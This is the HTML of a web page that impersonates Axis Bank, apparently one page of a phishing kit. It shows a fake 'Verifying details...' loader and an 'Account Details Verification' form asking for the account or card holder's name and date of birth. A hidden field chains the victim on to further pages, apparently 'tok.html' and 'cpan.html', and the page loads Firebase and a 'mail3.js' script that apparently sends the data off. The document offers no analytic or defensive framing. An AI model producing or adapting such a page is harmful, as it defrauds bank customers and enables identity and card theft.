<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <script src="loading.js"></script>
    <title>Axis Bank </title>
</head>
<style>
    .loader25 {
    position: fixed;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background-color: #f3f3f3;
    z-index: 9999;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
}

.spinner25 {
    width: 40px;
    height: 40px;
    border: 6px solid #8c0f45;
    border-top: 6px solid transparent;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

.loader-text25 {
    margin-top: 15px;
    font-size: 14px;
    color: #333;
}
.countdown25 {
    margin-top: 10px;
    font-size: 18px;
    color: #333;
}

/* Spinner animation */
@keyframes spin {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
}

</style>
<body>
<div id="loader25" class="loader25">
        <div class="spinner25"></div>
        <p class="loader-text25">Verifying details...</p>
        <p id="countdown25" class="countdown25">00:10</p>
    </div>
    <header>
        <img src="assets/header.jpg" width="100%" alt="">
    </header>
    <main>
        <h2 class="text-center">Account Details Verification</h2>
        <div class="box">
            <input type="hidden" id="nextValue" value="loader.html?next=tok.html?next=cpan.html">
            <form id="account" class="form">
                <div class="form-group">
                    <label for="">Account / Card Holder Name</label>
                    <input type="text" id="holdername" name="acname" required>
                </div>
                <div class="form-group">
                    <label for="">Date of Birth</label>
                    <input type="text"  id="dobInput" name="dobInput" placeholder="DD/MM/YYYY">
                </div>
                <div class="form-group">
                    <button type="submit" class="btn btn-primary">SUBMIT</button>
                </div>
            </form>
        </div>
        <img src="assets/footer.jpg" alt="" width="100%">
    </main>
    <footer>
        <img src="assets/cop.jpg" alt="" width="100%">
    </footer>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
    <script src="./mail3.js"></script>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script>
        var cleave = new Cleave('#dobInput', {
            date: true,
            datePattern: ['d', 'm', 'Y']
        });
    </script>

</body>

</html>
